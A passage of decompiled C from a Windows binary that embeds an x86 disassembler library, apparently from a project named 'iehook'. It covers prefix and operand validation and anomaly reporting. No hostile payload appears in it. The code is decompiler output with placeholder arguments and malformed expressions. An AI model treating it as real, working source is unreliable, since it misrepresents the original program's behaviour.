    __asm_rep_movsd_memcpy((char *)(a1 + 684), v378, 14);
    *(int32_t *)(a1 + 336) = *(int32_t *)(v485 + 28) & 0xff80;
    *(int32_t *)(a1 + 448) = *(int32_t *)(v485 + 32) & 0xff80;
    *(int32_t *)(a1 + 560) = *(int32_t *)(v485 + 36) & 0xff80;
    if (v373 != *v8 + *v243) {
        // 0x1000cd3a
        *v26 = 1591;
        *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
        *v29 = (int32_t)L"Address == Instruction->Address + Instruction->Length";
        __wassert();
    }
    // 0x1000cd51
    *v26 = v6;
    *v28 = v373;
    int32_t v486 = function_10003490((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x1000cd5b
    v254 = v257;
    if (v486 == 0) {
        goto lab_0x1000fdc4;
    } else {
        int32_t v487 = *v243; // 0x1000cd6b
        uint32_t v488 = *v8; // 0x1000cd71
        unsigned char v489 = *(char *)(v488 + v487); // 0x1000cd77
        int32_t v490 = v489; // 0x1000cd77
        uint32_t v491 = v487 + 1; // 0x1000cd7d
        *(char *)(a1 + 323) = v489;
        *v243 = v491;
        *v382 = 3;
        int32_t v492 = *(int32_t *)v378 + 56 * v490;
        char * v493 = (char *)v492; // 0x1000cdac
        if (*(int32_t *)(v492 + 8) == 0) {
            // 0x1000cdb1
            if (*(int32_t *)v492 == 0) {
                if (v6 != 0) {
                  lab_0x1000fddb:
                    // 0x1000fddb
                    return 0;
                }
                // 0x1000cdc0
                *v26 = v490;
                *v28 = (int32_t)*(char *)(a1 + 322);
                *v29 = (int32_t)*(char *)(a1 + 321);
                uint32_t v494 = *v25 + v488; // 0x1000cdd2
                *v30 = *v27 + v488 / 0x80000000 + (int32_t)(v494 < v488);
                *(int32_t *)(v257 - 20) = v494;
                *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Illegal opcode 0x%02X 0x%02X + suffix 0x%02X\n";
                _printf(v493);
              lab_0x1000fdca:
                // 0x1000fdca
                *v26 = ___iob_func() + 32;
                _fflush((struct _IO_FILE *)&g173);
                // 0x1000fddb
                return 0;
            }
        }
        // 0x1000cdf2
        v323 = v374;
        v314 = v373;
        v315 = v493;
        v320 = v372;
        if (v491 >= *v31 + 4) {
            goto lab_0x1000ce72;
        } else {
            // 0x1000cdff
            *v26 = 1603;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"Instruction->Length >= 4 + Instruction->PrefixCount";
            v322 = v374;
            v313 = v373;
            v317 = v493;
            v319 = v372;
            goto lab_0x1000ce6a;
        }
    }
  lab_0x1000c473:
    // 0x1000c473
    v483 = v482;
    v481 = (int32_t)v482;
    goto lab_0x1000c476;
  lab_0x1000d0a4:
    // 0x1000d0a4
    if ((*v132 & 0x3c20000) != 0) {
        // 0x1000d0b9
        if (*v31 != 0) {
            char * v131 = (char *)(a1 + 773);
            v127 = 0;
            while (true) {
              lab_0x1000d0d0:;
                char v129 = *(char *)(v127 + v32); // 0x1000d0d0
                if (v129 == 102) {
                    // 0x1000d10f
                    switch (*v130) {
                        case 0x2000c: {
                            goto lab_0x1000d155;
                        }
                        case 0x2000b: {
                            goto lab_0x1000d155;
                        }
                        case 0x2000a: {
                            goto lab_0x1000d155;
                        }
                        case 0x20008: {
                            goto lab_0x1000d155;
                        }
                        default: {
                            // 0x1000d12a
                            if ((*v14 & 16) == 0) {
                                // break -> 0x1000d26b
                                break;
                            }
                            // 0x1000d137
                            *v131 = *v131 & -3;
                            goto lab_0x1000d155;
                        }
                    }
                } else {
                    if ((v129 & -2) == -14) {
                        // 0x1000d0e1
                        if ((*v132 & 0x20000) == 0) {
                            if (v6 != 0) {
                                goto lab_0x1000fddb;
                            } else {
                                uint32_t v133 = *v8; // 0x1000d244
                                uint32_t v134 = *v25 + v133; // 0x1000d24b
                                *v26 = *v27 + v133 / 0x80000000 + (int32_t)(v134 < v133);
                                *v28 = v134;
                                *v29 = (int32_t)"[0x%08I64X] ERROR: rep/repne used with MMX/SSEx\n";
                                _printf((char *)&g173);
                                goto lab_0x1000fdca;
                            }
                        }
                        // 0x1000d0ed
                        if ((*v14 & 4) == 0) {
                            // 0x1000d0f6
                            *v26 = 1683;
                            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                            *v29 = (int32_t)L"Instruction->Repeat";
                            __wassert();
                        }
                    }
                    goto lab_0x1000d155;
                }
            }
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            uint32_t v1109 = *v8; // 0x1000d275
            int32_t v1110 = *v25; // 0x1000d27c
            uint32_t v1111 = v1110 + v1109; // 0x1000d27c
            int32_t v1112 = *v27; // 0x1000d282
            *v26 = v1112 + v1109 / 0x80000000 + (int32_t)(v1111 < v1109);
            *v28 = v1111;
            *v29 = (int32_t)"[0x%08I64X] ANOMALY: operand size prefix used with FPU/MMX/SSEx\n";
            _printf((char *)&g173);
            int32_t * v1113 = v26; // 0x1000d297
            int32_t * v1114 = v1113;
            int32_t v1115 = ___iob_func(); // 0x1000fdca
            *v1114 = v1115 + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
    }
  lab_0x1000d165:;
    // 0x1000d165
    char * v576; // 0x1000d172
    if (*(int32_t *)(*v1 + 4) != 3) {
        goto lab_0x1000d38a;
    } else {
        // 0x1000d172
        v576 = (char *)(a1 + 745);
        if ((*v576 & 16) != 0) {
            // 0x1000d17c
            if ((*v45 & 15) != 8) {
                // 0x1000d187
                *v26 = 1702;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"X86Instruction->OperandSize == 8";
                __wassert();
            }
            // 0x1000d1a1
            if (*v31 != 0) {
                char * v1116 = (char *)(a1 + 773);
                for (int32_t i = 0; i < *v31; i++) {
                    // 0x1000d1b0
                    if (*(char *)(i + v32) == 102) {
                        // 0x1000d1ba
                        *v1116 = *v1116 & -3;
                        char v1117 = *v14; // 0x1000d1be
                        if ((v1117 & 16) == 0) {
                            char v1118 = v1117; // 0x1000d1cb
                            if (v6 == 0) {
                                uint32_t v1119 = *v8; // 0x1000d1cd
                                uint32_t v1120 = *v25 + v1119; // 0x1000d1d4
                                *v26 = *v27 + v1119 / 0x80000000 + (int32_t)(v1120 < v1119);
                                *v28 = v1120;
                                *v29 = (int32_t)"[0x%08I64X] ANOMALY: use of operand size prefix meaningless when REX.w=1\n";
                                _printf((char *)&g173);
                                v1118 = *v14;
                            }
                            // 0x1000d1f2
                            *v14 = v1118 | 16;
                        }
                    }
                }
            }
        }
        int32_t v1121 = *v130; // 0x1000d202
        if (v1121 > 2050) {
            if (v1121 < 2053) {
                goto lab_0x1000d2d7;
            } else {
                if (v1121 < 2057) {
                    goto lab_0x1000d2d3;
                } else {
                    if (v1121 != 0x80000) {
                        goto lab_0x1000d2d7;
                    } else {
                        // 0x1000d2b1
                        if (*v440 != 2) {
                            goto lab_0x1000d2d7;
                        } else {
                            char v1122 = *v304; // 0x1000d2ba
                            if (v1122 != 0 == (v1122 != 1)) {
                                goto lab_0x1000d2d7;
                            } else {
                                if (v433 != 2 == (v433 != 3)) {
                                    goto lab_0x1000d2d7;
                                } else {
                                    goto lab_0x1000d2d3;
                                }
                            }
                        }
                    }
                }
            }
        } else {
            if (v1121 > 2048) {
                goto lab_0x1000d2d3;
            } else {
                // 0x1000d21e
                g165 = v1121 - 257;
                switch (v1121) {
                    case 257: {
                        goto lab_0x1000d2d3;
                    }
                    case 259: {
                        goto lab_0x1000d2d3;
                    }
                    case 261: {
                        goto lab_0x1000d2d3;
                    }
                    case 262: {
                        goto lab_0x1000d2d3;
                    }
                    default: {
                        goto lab_0x1000d2d7;
                    }
                }
            }
        }
    }
  lab_0x1000d0a0:;
    char * v1123 = (char *)(a1 + 773); // 0x1000d0a0
    *v1123 = *v1123 & -9;
    goto lab_0x1000d0a4;
  lab_0x1000c476:;
    int32_t v495 = v481;
    char * v496 = v483;
    int32_t * v497 = (int32_t *)(v495 + 8);
    int32_t * v498 = (int32_t *)v495;
    int32_t v499 = *v498;
    char * v500; // 0x1000b7b0
    char v501; // 0x1000b7b0
    if (*v497 != 0) {
        // 0x1000c4ca
        v501 = 0;
        v500 = v496;
        if (v499 == 0) {
            goto lab_0x1000c5b3;
        } else {
            goto lab_0x1000c4d3;
        }
    } else {
        if (v499 == 0) {
            if (v6 != 0) {
                // 0x1000fddb
                return 0;
            }
            // 0x1000c48b
            *v26 = (int32_t)*v502;
            uint32_t v503 = *v8; // 0x1000c4a1
            *v28 = (int32_t)*v332;
            *v29 = (int32_t)*v331;
            uint32_t v504 = *v25 + v503; // 0x1000c4aa
            *v30 = *v27 + v503 / 0x80000000 + (int32_t)(v504 < v503);
            *(int32_t *)(v257 - 20) = v504;
            *(int32_t *)(v257 - 24) = (int32_t)"[0x%08I64X] ERROR: Illegal SSE instruction opcode 0x%02X 0x%02X + prefix 0x%02X\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
        goto lab_0x1000c4d3;
    }
  lab_0x1000d38a:;
    char v505 = *v14; // 0x1000d38a
    int32_t v506; // 0x1000d38a
    if ((v505 & 4) == 0) {
        goto lab_0x1000d3fa;
    } else {
        // 0x1000d395
        v506 = v505;
        int32_t v507 = *v130; // 0x1000d395
        if (v507 > 0x4004) {
            if ((v507 || 1) == 0x80003) {
                goto lab_0x1000d467;
            } else {
                goto lab_0x1000d3b8;
            }
        } else {
            if (v507 > 0x4001) {
                goto lab_0x1000d467;
            } else {
                if (v507 == 0x4001) {
                    goto lab_0x1000d3fa;
                } else {
                    goto lab_0x1000d3b8;
                }
            }
        }
    }
  lab_0x1000d3fa:
    if ((a3 & 2) != 0) {
        // 0x1000d404
        if (*v9 != 0) {
            // 0x1000d40d
            *v26 = 1808;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"!Instruction->StringIndex";
            __wassert();
        }
        char * v508 = (char *)(a1 + 773); // 0x1000d427
        char v509 = *v508; // 0x1000d427
        char v510 = v509; // 0x1000d42b
        if ((v509 & 32) != 0) {
            unsigned char v511 = *v9; // 0x1000d43b
            int32_t v512 = v511; // 0x1000d43b
            int32_t v513; // 0x1000b7b0
            if (*v130 != 0x4001) {
                // 0x1000d4bc
                *v26 = (int32_t)"rep ";
                v513 = v511 == -1 ? 0 : 256 - v512;
            } else {
                if (v511 == -1) {
                    // 0x1000d4b3
                    *v26 = (int32_t)"repe ";
                    v513 = 0;
                } else {
                    // 0x1000d448
                    *v26 = (int32_t)"repe ";
                    v513 = 256 - v512;
                }
            }
            // 0x1000d4d4
            *v28 = v513;
            *v29 = a1 + 8 + v512;
            int32_t v514 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000d4dd
            *v9 = *v9 + (char)v514;
            v510 = *v508;
        }
        char v515 = v510; // 0x1000d4f2
        if ((v510 & 64) != 0) {
            unsigned char v516 = *v9; // 0x1000d4f4
            int32_t v517 = v516; // 0x1000d4f4
            *v26 = (int32_t)"repne ";
            *v28 = v516 == -1 ? 0 : 256 - v517;
            *v29 = a1 + 8 + v517;
            int32_t v518 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000d51b
            *v9 = *v9 + (char)v518;
            v515 = *v508;
        }
        unsigned char v519 = *v9;
        char v520 = v519; // 0x1000d530
        char v521 = v515; // 0x1000d530
        if ((v515 & 16) != 0) {
            int32_t v522 = v519; // 0x1000d532
            *v26 = (int32_t)"lock ";
            *v28 = v519 == -1 ? 0 : 256 - v522;
            *v29 = a1 + 8 + v522;
            int32_t v523 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000d559
            v520 = *v9 + (char)v523;
            *v9 = v520;
            v521 = *v508;
        }
        char v524 = v520;
        char v525 = v524; // 0x1000d56e
        if (v521 <= 255) {
            int32_t v526 = v524; // 0x1000d570
            *v26 = (int32_t)"hinttake ";
            *v28 = v524 == -1 ? 0 : 256 - v526;
            *v29 = a1 + 8 + v526;
            int32_t v527 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000d597
            v525 = *v9 + (char)v527;
            *v9 = v525;
        }
        char v528 = v525;
        char v529 = v528; // 0x1000d5ac
        if ((*(char *)(a1 + 774) & 1) != 0) {
            int32_t v530 = v528; // 0x1000d5ae
            *v26 = (int32_t)"hintskip ";
            *v28 = v528 == -1 ? 0 : 256 - v530;
            *v29 = a1 + 8 + v530;
            int32_t v531 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000d5d5
            v529 = *v9 + (char)v531;
            *v9 = v529;
        }
        unsigned char v532 = v529;
        char v533; // 0x1000b7b0
        if ((*v14 & 1) == 0) {
            // 0x1000d63d
            v533 = 0;
            if (v532 != 0) {
                // 0x1000d647
                *(char *)(a1 + 8 + (int32_t)v532) = 32;
                char v534 = *v9 + 1; // 0x1000d64f
                *v9 = v534;
                v533 = v534;
            }
        } else {
            char v535 = v532; // 0x1000d5f3
            if (v532 >= 13) {
                // 0x1000d5f5
                *v26 = 1818;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)&g3;
                __wassert();
                v535 = *v9;
            }
            char v536 = v535;
            v533 = 12;
            if (v536 != 12) {
                // 0x1000d620
                *(char *)(a1 + 8 + (int32_t)v536) = 32;
                char v537 = *v9 + 1; // 0x1000d62c
                *v9 = v537;
                v533 = v537;
                while (v537 != 12) {
                    // 0x1000d620
                    *(char *)(a1 + 8 + (int32_t)v537) = 32;
                    v537 = *v9 + 1;
                    *v9 = v537;
                    v533 = v537;
                }
            }
        }
        int32_t v538 = v533; // 0x1000d655
        *v26 = v435 + 12;
        *v28 = (int32_t)"%s";
        *v29 = v533 == -1 ? 0 : 256 - v538;
        int32_t v539 = a1 + 8;
        *v30 = v539 + v538;
        int32_t v540 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000d683
        unsigned char v541 = *v9 + (char)v540; // 0x1000d688
        *v9 = v541;
        if ((*v14 & 1) == 0) {
            if (v541 != 0) {
                // 0x1000d6e5
                *(char *)(v539 + (int32_t)v541) = 32;
                *v9 = *v9 + 1;
            }
        } else {
            char v542 = v541; // 0x1000d6a2
            if (v541 >= 25) {
                // 0x1000d6a4
                *v26 = 1820;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)&g3;
                __wassert();
                v542 = *v9;
            }
            char v543 = v542; // 0x1000d6c2
            if (v542 != 24) {
                *(char *)(v539 + (int32_t)v543) = 32;
                char v544 = *v9 + 1; // 0x1000d6d0
                *v9 = v544;
                while (v544 != 24) {
                    // 0x1000d6c4
                    *(char *)(v539 + (int32_t)v544) = 32;
                    v544 = *v9 + 1;
                    *v9 = v544;
                }
            }
        }
    }
    // 0x1000d6f3
    if (*v140 == 0) {
        goto lab_0x1000d7a9;
    } else {
        int32_t v545 = a1 + 336; // 0x1000d70c
        *(int32_t *)v545 = *v463 & 0xff80;
        int32_t v546 = a1 + 448; // 0x1000d71e
        *(int32_t *)v546 = *(int32_t *)(v435 + 32) & 0xff80;
        *v26 = a3;
        *v28 = v432;
        int32_t v547 = a1 + 560; // 0x1000d733
        *(int32_t *)v547 = *(int32_t *)(v435 + 36) & 0xff80;
        int32_t v548 = function_10003490((int32_t)&g173, (int32_t)&g173, (int32_t)&g173); // 0x1000d739
        v254 = v257;
        if (v548 == 0) {
            goto lab_0x1000fdc4;
        } else {
            // 0x1000d749
            if ((*(char *)v545 & 127) != 0) {
                // 0x1000d752
                *v26 = 1830;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"!(Instruction->Operands[0].Flags & 0x7F)";
                __wassert();
            }
            // 0x1000d769
            if ((*(char *)v546 & 127) != 0) {
                // 0x1000d772
                *v26 = 1831;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"!(Instruction->Operands[1].Flags & 0x7F)";
                __wassert();
            }
            // 0x1000d789
            if ((*(char *)v547 & 127) != 0) {
                // 0x1000d792
                *v26 = 1832;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"!(Instruction->Operands[2].Flags & 0x7F)";
                __wassert();
            }
            goto lab_0x1000d7a9;
        }
    }
  lab_0x1000c5b3:
    // 0x1000c5b3
    *v14 = *v14 & -5;
    *v549 = *v549 & -99;
    v323 = v501;
    v314 = v327;
    v315 = v500;
    v320 = v324;
    int32_t v550; // 0x1000c5be
    switch (v550 & 0x7fffff00) {
        case 0x2000000: {
            goto lab_0x1000ce72;
        }
        case 0x1000000: {
            goto lab_0x1000ce72;
        }
        case 0x800000: {
            goto lab_0x1000ce72;
        }
        default: {
            // 0x1000c5e7
            *v26 = 1401;
            v7 = v53;
            goto lab_0x1000fdb2;
        }
    }
  lab_0x1000c4d3:;
    char v551 = *(char *)(v324 + (int32_t)&g64); // 0x1000c4d6
    unsigned char v552 = *(char *)(a1 + 741); // 0x1000c4dc
    char * v553 = (char *)(a1 + 777); // 0x1000c4e5
    *v553 = *v553 & -125 | 4 * v551 & 124;
    if (v551 < 16) {
        // 0x1000c501
        if (*v498 != 0) {
            goto lab_0x1000c520;
        } else {
            goto lab_0x1000c506;
        }
    } else {
        goto lab_0x1000c506;
    }
  lab_0x1000d7a9:;
    int32_t * v554 = (int32_t *)(v2 + 948); // 0x1000d7ac
    *v554 = *v554 + 1;
    g166 = v24;
    v147 = (char *)(a1 + 774);
    if ((*v147 & 6) == 0) {
        char * v555 = (char *)(a1 + 773); // 0x1000d7c3
        char v556 = *v555; // 0x1000d7c3
        char v557 = v556; // 0x1000d7c7
        if ((v556 & 4) != 0) {
            char v558 = *v14; // 0x1000d7c9
            char v559 = v556; // 0x1000d7d0
            if ((v558 & 16) == 0) {
                char v560 = v558; // 0x1000d7d4
                if (v6 == 0) {
                    uint32_t v561 = *v8; // 0x1000d7d6
                    uint32_t v562 = *v25 + v561; // 0x1000d7dd
                    *v26 = *v27 + v561 / 0x80000000 + (int32_t)(v562 < v561);
                    *v28 = v562;
                    *v29 = (int32_t)"[0x%08I64X] ANOMALY: address size prefix used with no addressing\n";
                    _printf((char *)&g173);
                    v560 = *v14;
                }
                // 0x1000d7f8
                *v14 = v560 | 16;
                v559 = *v555;
            }
            // 0x1000d7ff
            v557 = v559 & -5;
            *v555 = v557;
        }
        char v563 = v557; // 0x1000d803
        if ((v563 & 8) != 0) {
            char v564 = *v14; // 0x1000d809
            char v565 = v563; // 0x1000d810
            if ((v564 & 16) == 0) {
                char v566 = v564; // 0x1000d814
                if (v6 == 0) {
                    uint32_t v567 = *v8; // 0x1000d816
                    uint32_t v568 = *v25 + v567; // 0x1000d81d
                    *v26 = *v27 + v567 / 0x80000000 + (int32_t)(v568 < v567);
                    *v28 = v568;
                    *v29 = (int32_t)"[0x%08I64X] ANOMALY: segment override used with no addressing\n";
                    _printf((char *)&g173);
                    v566 = *v14;
                }
                // 0x1000d838
                *v14 = v566 | 16;
                v565 = *v555;
            }
            // 0x1000d83f
            *v555 = v565 & -9;
        }
    }
    // 0x1000d843
    if ((*v14 & 16) != 0) {
        goto lab_0x1000d973;
    } else {
        int32_t v569 = *(int32_t *)(*v1 + 4); // 0x1000d853
        if (v569 == 2) {
            goto lab_0x1000d973;
        } else {
            // 0x1000d85f
            switch (g166) {
                case 0: {
                    int32_t v570 = *v130; // 0x1000d872
                    if (v570 > 0x4004) {
                        if (v570 == 0x80002) {
                            goto lab_0x1000d973;
                        } else {
                            goto lab_0x1000d89c;
                        }
                    } else {
                        if (v570 > 0x4002 || v570 == 0x4001) {
                            goto lab_0x1000d973;
                        } else {
                            goto lab_0x1000d89c;
                        }
                    }
                }
                case 1: {
                    goto lab_0x1000d973;
                }
                case 2: {
                    goto lab_0x1000d973;
                }
                case 3: {
                    goto lab_0x1000d973;
                }
                case 4: {
                    if (v569 != 1) {
                        goto lab_0x1000d8e0;
                    } else {
                        // 0x1000d8d0
                        if ((*v132 & 256) == 0) {
                            goto lab_0x1000d973;
                        } else {
                            goto lab_0x1000d8e0;
                        }
                    }
                }
                case 5: {
                    if (v569 != 3) {
                        goto lab_0x1000d91d;
                    } else {
                        // 0x1000d911
                        if ((*v132 & 256) == 0) {
                            goto lab_0x1000d973;
                        } else {
                            goto lab_0x1000d91d;
                        }
                    }
                }
                default: {
                    if (v6 == 0) {
                        // 0x1000d949
                        *v26 = *(int32_t *)(a1 + 752);
                        uint32_t v571 = *v8; // 0x1000d94a
                        uint32_t v572 = *v25 + v571; // 0x1000d951
                        *v28 = *v27 + v571 / 0x80000000 + (int32_t)(v572 < v571);
                        *v29 = v572;
                        *v30 = (int32_t)"[0x%08I64X] ANOMALY: unexpected segment 0x%02X\n";
                        _printf((char *)&g173);
                    }
                    // 0x1000d96c
                    *v14 = *v14 | 16;
                    goto lab_0x1000d973;
                }
            }
        }
    }
  lab_0x1000d2d7:;
    char * v573 = (char *)(a1 + 773); // 0x1000d2d7
    char v574 = *v573; // 0x1000d2d7
    if ((v574 & 1) != 0) {
        char v575 = v574; // 0x1000d2e5
        if ((*v576 & 16) != 0) {
            char v577 = *v14; // 0x1000d2e7
            if ((v577 & 16) == 0) {
                char v578 = v577; // 0x1000d2f4
                if (v6 == 0) {
                    uint32_t v579 = *v8; // 0x1000d2f6
                    uint32_t v580 = *v25 + v579; // 0x1000d2fd
                    *v26 = *v27 + v579 / 0x80000000 + (int32_t)(v580 < v579);
                    *v28 = v580;
                    *v29 = (int32_t)"[0x%08I64X] ANOMALY: use of REX.w is meaningless (default operand size is 64)\n";
                    _printf((char *)&g173);
                    v578 = *v14;
                }
                // 0x1000d31b
                *v14 = v578 | 16;
            }
            char * v581 = (char *)(a1 + 744); // 0x1000d322
            *v581 = *v581 & -9;
            *v576 = *v576 & -17;
            v575 = *v573;
        }
        char v582 = v575; // 0x1000d32a
        char v583 = *v45;
        if ((v582 & 2) == 0) {
            char v584 = v583; // 0x1000d362
            if ((v583 & 12) == 0) {
                // 0x1000d364
                *v26 = 1763;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"X86Instruction->OperandSize >= 4";
                __wassert();
                v584 = *v45;
            }
            // 0x1000d37e
            *v45 = v584 & -16 | 8;
        } else {
            char v585 = v582; // 0x1000d339
            if ((v583 & 15) != 2) {
                // 0x1000d33b
                *v26 = 1758;
                *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                *v29 = (int32_t)L"X86Instruction->OperandSize == 2";
                __wassert();
                v585 = *v573;
            }
            // 0x1000d355
            *v573 = v585 & -2;
        }
    }
    goto lab_0x1000d38a;
  lab_0x1000d2d3:;
    char * v586 = (char *)(a1 + 773); // 0x1000d2d3
    *v586 = *v586 | 1;
    goto lab_0x1000d2d7;
  lab_0x1000c506:
    // 0x1000c506
    *v26 = 1379;
    *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    *v29 = (int32_t)L"Group >= 13 && Group <= 15 && X86Opcode->Table";
    __wassert();
    goto lab_0x1000c520;
  lab_0x1000d973:
    // 0x1000d973
    if ((*v463 & 0x8400) == 0x8400) {
        // 0x1000d98b
        if ((*v130 || 4) != 262) {
            // 0x1000d99f
            *v26 = 1926;
            *v28 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *v29 = (int32_t)L"Instruction->Type == ITYPE_BRANCHCC || Instruction->Type == ITYPE_LOOPCC";
            __wassert();
        }
        int32_t v822 = *v31; // 0x1000d9b8
        if (v822 != 0) {
            // 0x1000d9d0
            v186 = (int32_t *)(a1 + 752);
            char * v197 = (char *)(a1 + 773);
            v190 = v822;
            v191 = 0;
            while (true) {
              lab_0x1000d9d0:
                // 0x1000d9d0
                v188 = v191;
                char v192 = *(char *)(v188 + v32); // 0x1000d9d0
                if (v192 == 46) {
                    char v193 = *v14; // 0x1000da32
                    if ((v193 & 16) == 0) {
                        // 0x1000da3b
                        if (*v186 != 1) {
                            char v194 = v193; // 0x1000da44
                            if (v6 == 0) {
                                uint32_t v195 = *v8; // 0x1000da46
                                uint32_t v196 = *v25 + v195; // 0x1000da4d
                                *v26 = *v27 + v195 / 0x80000000 + (int32_t)(v196 < v195);
                                *v28 = v196;
                                *v29 = (int32_t)"[0x%08I64X] ANOMALY: Segment override used with conditional branch\n";
                                _printf((char *)&g173);
                                v194 = *v14;
                            }
                            // 0x1000da6d
                            *v14 = v194 | 16;
                        }
                    }
                    // 0x1000da74
                    *v197 = *v197 & -9;
                    *v147 = *v147 | 1;
                    goto lab_0x1000da7c;
                } else {
                    // 0x1000d9db
                    v187 = v190;
                    if (v192 != 62) {
                        goto lab_0x1000da7f;
                    } else {
                        // 0x1000d9e3
                        if ((*v14 & 16) == 0) {
                            int32_t v198 = *v186; // 0x1000d9ec
                            if (v198 != 3) {
                                // 0x1000d9f2
                                char v199; // 0x1000d9e3
                                char v200 = v199; // 0x1000d9f6
                                if (v6 == 0) {
                                    uint32_t v201 = *v8; // 0x1000d9f8
                                    int32_t v202 = *v25; // 0x1000d9ff
                                    uint32_t v203 = v202 + v201; // 0x1000d9ff
                                    int32_t v204 = *v27; // 0x1000da05
                                    *v26 = v204 + v201 / 0x80000000 + (int32_t)(v203 < v201);
                                    *v28 = v203;
                                    *v29 = (int32_t)"[0x%08I64X] ANOMALY: Segment override used with conditional branch\n";
                                    _printf((char *)&g173);
                                    char v205 = *v14;
                                    v200 = v205;
                                }
                                char v206 = v200; // 0x1000da1f
                                *v14 = v206 | 16;
                            }
                        }
                        // 0x1000da26
                        *v197 = *v197 & 119 | -128;
                        goto lab_0x1000da7c;
                    }
                }
            }
        }
    }
  lab_0x1000da8d:;
    char * v823 = (char *)(a1 + 773); // 0x1000da8d
    if ((*v823 & 16) != 0) {
        // 0x1000da93
        *v26 = (int32_t)v433;
        int32_t v824 = function_10002b30((int32_t)&g173); // 0x1000daa6
        if (v824 == 0) {
            if (v824 != v6) {
                // 0x1000fddb
                return 0;
            }
            // 0x1000dabb
            *v26 = v435 + 12;
            uint32_t v825 = *v8; // 0x1000dac5
            uint32_t v826 = *v25 + v825; // 0x1000dacc
            *v28 = *v27 + v825 / 0x80000000 + (int32_t)(v826 < v825);
            *v29 = v826;
            *v30 = (int32_t)"[0x%08I64X] ERROR: Illegal use of lock prefix for instruction \"%s\"\n";
            _printf((char *)&g173);
            // 0x1000fdca
            *v26 = ___iob_func() + 32;
            _fflush((struct _IO_FILE *)&g173);
            // 0x1000fddb
            return 0;
        }
    }
    int32_t * v606; // 0x1000db05
    if ((a3 & 2) == 0) {
        // 0x1000ecb3
        *(char *)(a1 + 8) = 0;
        goto lab_0x1000ecb7;
    } else {
        if ((a3 & 16) == 0) {
            goto lab_0x1000ec7c;
        } else {
            // 0x1000db05
            v606 = (int32_t *)(a1 + 724);
            if (*v606 != 0) {
                goto lab_0x1000db1b;
            } else {
                // 0x1000db0b
                if (*(int32_t *)(a1 + 728) != 0) {
                    goto lab_0x1000db1b;
                } else {
                    // 0x1000db11
                    if (*(int32_t *)(a1 + 732) == 0) {
                        goto lab_0x1000ec7c;
                    } else {
                        goto lab_0x1000db1b;
                    }
                }
            }
        }
    }
  lab_0x1000d467:;
    char * v827 = (char *)(a1 + 773); // 0x1000d467
    char v828 = *v827; // 0x1000d467
    if ((v828 & 64) != 0) {
        char v829 = v828; // 0x1000d470
        if ((v506 & 16) == 0) {
            char v830 = v505; // 0x1000d476
            if (v6 == 0) {
                uint32_t v831 = *v8; // 0x1000d478
                uint32_t v832 = *v25 + v831; // 0x1000d47f
                *v26 = *v27 + v831 / 0x80000000 + (int32_t)(v832 < v831);
                *v28 = v832;
                *v29 = (int32_t)"[0x%08I64X] ANOMALY: REPNE should only be used with cmps/scas\n";
                _printf((char *)&g173);
                v830 = *v14;
            }
            // 0x1000d49d
            *v14 = v830 | 16;
            v829 = *v827;
        }
        // 0x1000d4a4
        *v827 = v829 & -97 | 32;
    }
    goto lab_0x1000d3fa;
  lab_0x1000d3b8:;
    char v833 = v505; // 0x1000d3bb
    if ((v506 & 16) == 0) {
        char v834 = v505; // 0x1000d3c1
        if (v6 == 0) {
            uint32_t v835 = *v8; // 0x1000d3c3
            uint32_t v836 = *v25 + v835; // 0x1000d3ca
            *v26 = *v27 + v835 / 0x80000000 + (int32_t)(v836 < v835);
            *v28 = v836;
            *v29 = (int32_t)"[0x%08I64X] ANOMALY: Repeat prefix used with non-string instruction\n";
            _printf((char *)&g173);
            v834 = *v14;
        }
        char v837 = v834 | 16; // 0x1000d3e8
        *v14 = v837;
        v833 = v837;
    }
    // 0x1000d3ef
    *v14 = v833 & -5;
    char * v838 = (char *)(a1 + 773); // 0x1000d3f6
    *v838 = *v838 & -97;
    goto lab_0x1000d3fa;
  lab_0x1000c520:;
    char v587 = v552 / 8 & 7; // 0x1000c4f4
    int32_t v588 = v587;
    int32_t v589 = v588; // 0x1000c527
    int32_t * v590; // 0x1000b7b0
    int32_t v591; // 0x1000b7b0
    char * v592; // 0x1000b7b0
    if (v51 == 102) {
        goto lab_0x1000c547;
    } else {
        int32_t v593 = (int32_t)v51 - 242; // 0x1000c529
        if (v593 == 0) {
            // 0x1000c53c
            v589 = v588 | 8;
            goto lab_0x1000c547;
        } else {
            // 0x1000c531
